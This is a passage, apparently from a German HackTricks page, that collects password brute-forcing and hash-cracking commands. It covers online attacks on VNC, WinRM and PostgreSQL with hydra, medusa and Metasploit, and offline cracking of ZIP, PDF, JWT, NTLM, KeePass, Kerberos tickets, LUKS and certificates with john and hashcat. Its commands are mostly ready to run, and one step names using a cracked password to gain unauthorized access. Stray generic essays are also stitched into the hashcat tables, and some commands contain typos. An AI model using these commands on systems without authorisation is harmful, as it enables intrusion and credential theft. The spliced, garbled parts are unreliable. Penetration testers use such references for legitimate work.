hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) ist ein Dienst, der es ermöglicht, Remote-Verwaltungsaufgaben auf Windows-Systemen auszuführen. Es verwendet das WS-Management-Protokoll, das auf SOAP (Simple Object Access Protocol) basiert. Winrm ermöglicht die Ausführung von Befehlen auf entfernten Systemen und die Übertragung von Dateien.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen** und zu **automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Lokal

### Online-Datenbanken zum Knacken

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 mit/ohne ESS/SSP und mit jedem Challenge-Wert)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-Captures und Archive von MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes und Datei-Hashes)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Schauen Sie sich dies an, bevor Sie versuchen, einen Hash per Brute Force zu knacken.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bekannter Klartext-Zip-Angriff

Sie müssen den **Klartext** (oder einen Teil des Klartexts) **einer Datei kennen, die sich im Inneren** des verschlüsselten Zips befindet. Sie können die **Dateinamen und die Größe der Dateien, die sich im Inneren befinden**, eines verschlüsselten Zips überprüfen, indem Sie: **`7z l encrypted.zip`** ausführen.\
Laden Sie [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) von der Seite mit den Veröffentlichungen herunter.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Brute-forcing a password-protected 7z file can be done using tools like `7z2john.pl` and `john`. The `7z2john.pl` script extracts the hash from the 7z file, which can then be cracked using `john` with a wordlist or incremental mode.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords from PDF files. Tools like `pdfcrack` and `hashcat` can be used to perform brute-force attacks on PDF files. These tools work by trying all possible combinations of characters until the correct password is found. It is important to note that brute-force attacks can be time-consuming, especially if the password is long and complex.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Owner Password

Um ein PDF-Besitzerpasswort zu knacken, überprüfen Sie dies: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM knacken
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting ist eine Technik, bei der schwache Kennwörter von Servicekonten in einem Active Directory-Netzwerk durch Brute-Force-Angriffe auf die Kerberos-Pre-Authentication-Datenbank ermittelt werden.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks Bild

#### Methode 1

Installiere: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Methode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Eine weitere Luks BF-Anleitung: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Privater Schlüssel
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Verwenden Sie [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) und dann john

### Open Office Pwd Protected Column

Wenn Sie eine xlsx-Datei mit einer Spalte haben, die durch ein Passwort geschützt ist, können Sie es entsperren:

* **Laden Sie es auf Google Drive hoch** und das Passwort wird automatisch entfernt
* Um es **manuell zu entfernen**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX-Zertifikate
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um mühelos **Workflows zu erstellen** und zu **automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Tools

**Hash-Beispiele:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-Identifier
```bash
hash-identifier
> <HASH>
```
### Wortlisten

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wortlisten-Generierungstools**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Fortgeschrittener Tastatur-Walk-Generator mit konfigurierbaren Basiszeichen, Tastaturzuordnung und Routen.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John-Mutation

Lesen Sie _**/etc/john/john.conf**_ und konfigurieren Sie es
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat Angriffe

* **Wörterbuchangriff** (`-a 0`) mit Regeln

**Hashcat** wird bereits mit einem **Ordner mit Regeln** geliefert, aber Sie können [**hier andere interessante Regeln finden**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Wortlisten-Kombinations**-Angriff

Es ist möglich, **2 Wortlisten zu einer zusammenzuführen** mit hashcat.\
Wenn Liste 1 das Wort **"hello"** enthielt und die zweite 2 Zeilen mit den Wörtern **"world"** und **"earth"** enthielt. Werden die Wörter `helloworld` und `helloearth` generiert.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Maskenangriff** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Wortliste + Maske (`-a 6`) / Masken + Wortliste (`-a 7`) Angriff
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat-Modi
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Forcing

### Introduction

Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute forcing involves attempting different password combinations to find the one that matches the hashed password stored in the file.

### Tools and Resources

There are various tools available for brute forcing passwords, such as John the Ripper, Hashcat, and Hydra. These tools use different algorithms and techniques to efficiently crack passwords. Additionally, wordlists containing commonly used passwords or dictionary words can also be used to increase the chances of success in a brute force attack.

### Methodology

1. Obtain the hashed password from the `/etc/shadow` file on a Linux system.
2. Choose a suitable tool for brute forcing, such as John the Ripper.
3. Configure the tool with the hashed password and start the brute force attack.
4. Monitor the progress of the attack and wait for the tool to find the correct password.
5. Once the password is cracked, it can be used to gain unauthorized access to the system.

### Conclusion

Brute forcing is a powerful technique for cracking passwords, but it can be time-consuming depending on the complexity of the password. Using strong, unique passwords and implementing additional security measures can help protect against brute force attacks.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

## Introduction

Brute force attacks are a common way to crack passwords. They involve systematically checking all possible passwords until the correct one is found. This method can be used to crack Windows hashes by generating potential passwords and comparing their hash values to the target hash.

## Tools

There are several tools available for performing brute force attacks on Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that can be used for Windows hashes.
- **Hashcat**: Another powerful tool for cracking passwords, including Windows hashes.
- **Hydra**: A versatile password cracking tool that supports various protocols, including SMB for Windows hashes.

## Methodology

To crack Windows hashes using a brute force attack, follow these general steps:

1. Obtain the target hash that you want to crack.
2. Generate a list of potential passwords to test.
3. Use a password cracking tool like John the Ripper, Hashcat, or Hydra to compare the hash values of the potential passwords to the target hash.
4. Analyze the results to identify the correct password.

## Conclusion

Brute force attacks can be an effective way to crack Windows hashes, especially if the passwords are weak. By using the right tools and following a systematic approach, you can increase your chances of successfully cracking the target hash.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

## Brute Force Attack

Ein Brute-Force-Angriff ist eine Methode, bei der ein Angreifer systematisch alle möglichen Kombinationen von Passwörtern oder Schlüsseln ausprobiert, um unbefugten Zugriff auf ein System zu erlangen.

## Brute Force Tools

Es gibt verschiedene Tools wie Hydra, Medusa und John the Ripper, die für Brute-Force-Angriffe verwendet werden können. Diese Tools automatisieren den Prozess des Ausprobierens von Passwortkombinationen, um Schwachstellen in der Sicherheit eines Systems aufzudecken.

## Schutz vor Brute-Force-Angriffen

Um sich vor Brute-Force-Angriffen zu schützen, können Sicherheitsmaßnahmen wie die Implementierung von Sperrmechanismen nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen, die Verwendung von starken und eindeutigen Passwörtern sowie die Aktualisierung von Passwörtern in regelmäßigen Abständen ergriffen werden.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
